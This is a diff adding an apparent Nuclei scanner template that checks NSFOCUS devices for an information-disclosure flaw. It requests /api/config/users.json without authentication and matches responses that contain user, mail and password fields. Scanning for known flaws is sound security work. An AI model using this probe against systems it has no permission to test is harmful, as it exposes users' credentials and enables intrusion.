@@ -1,0 +1,26 @@
+id: nsfocus-users-Information-disclosure
+
+info:
+  name: 绿盟 users 信息泄露漏洞
+  author: xxx
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /api/config/users.json HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "permission"
+          - "mail"
+          - "password"
+        condition: and
+      - type: status
+        status: 
+          - 200
